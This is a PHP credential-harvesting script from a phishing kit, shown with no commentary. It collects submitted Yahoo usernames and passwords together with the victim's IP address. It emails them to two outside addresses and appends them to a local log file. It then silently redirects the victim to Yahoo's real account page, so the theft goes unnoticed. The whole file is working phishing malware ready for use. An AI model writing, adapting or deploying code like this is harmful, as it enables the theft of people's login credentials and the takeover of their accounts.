<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$data ="

-------------Blast--------------------
EmailUser: $username
Pass: $password
------------------------------------
IP:  $ip
--------------------------------
";

$subj = "Yahoo: $ip";

$fir = "fowintodasweety001@gmail.com"; 
$sec = "ronaldjohnson89@yahoo.com";
mail($fir,$subj,$data);
mail($sec,$subj,$data);

 $fp = fopen("sts.txt","a");
fputs($fp,$data);
fclose($fp);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html xmlns:java="http://xml.apache.org/xslt/java">
<META HTTP-EQUIV="Refresh" CONTENT="0;URL=https://login.yahoo.com/account/activity">
<head> 